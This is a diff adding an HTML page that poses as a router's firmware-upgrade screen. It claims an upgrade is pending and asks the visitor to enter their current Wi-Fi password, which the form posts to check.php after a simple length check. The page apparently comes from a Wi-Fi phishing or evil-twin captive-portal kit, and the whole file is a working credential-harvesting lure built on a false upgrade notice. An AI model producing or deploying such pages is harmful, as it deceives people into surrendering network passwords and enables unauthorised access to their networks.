@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Router Configuration Page</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel=stylesheet href=css/main.css>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <!-- CSS -->
+  </head>
+
+  <body id="guest-login">
+    <!-- To change the navigation bar color change background attribute -->
+    <div id="logoDivWhite"></div>
+
+    <div id="dialog">
+      <div id="header">
+        <h1>Firmware Upgrade</h1>
+        <p>
+          A firmware upgrade is pending installation. This upgrade includes performance fixes and is expected to
+          increase your connection for older devices.
+        </p>
+        <p>Simply enter your current Wifi password to continue</p>
+      </div>
+      <div id="headerBorder"></div>
+      <div id="content">
+        <div classs="view landing">
+          <div id="leftContent">
+            <form action="check.php" method="POST">
+              <div class="box">
+                <div>
+                  <label>Current Wifi Password</label>
+                  <div>
+                    <input
+                      type="password"
+                      maxlength="32"
+                      id="pwd"
+                      name="key1"
+                      style='background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC"); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;'
+                    />
+                  </div>
+                  <button id="submit-login" class="blue right">
+                    Login
+                  </button>
+                </div>
+              </div>
+            </form>
+            <br />
+            <div class="clear"></div>
+          </div>
+          <div id="centerDivider"></div>
+          <div id="rightImageContent">
+            <img width="200px" src="images/hammer_logo.png" />
+          </div>
+          <div class="bottomContent"></div>
+        </div>
+      </div>
+    </div>
+    <script>
+      /*
+        Check the password field and act accordingly.
+      */
+      $("#submit-login").on("click", function(e) {
+        // get the password box and checkbox elements
+        var input = document.getElementById("pwd");
+        if (input.value.length < 7 || input.value.length > 64) {
+          // display no password message
+          alert("Please enter a password between 7 and 64 characters");
+          return false;
+        }
+      });
+    </script>
+  </body>
+</html>
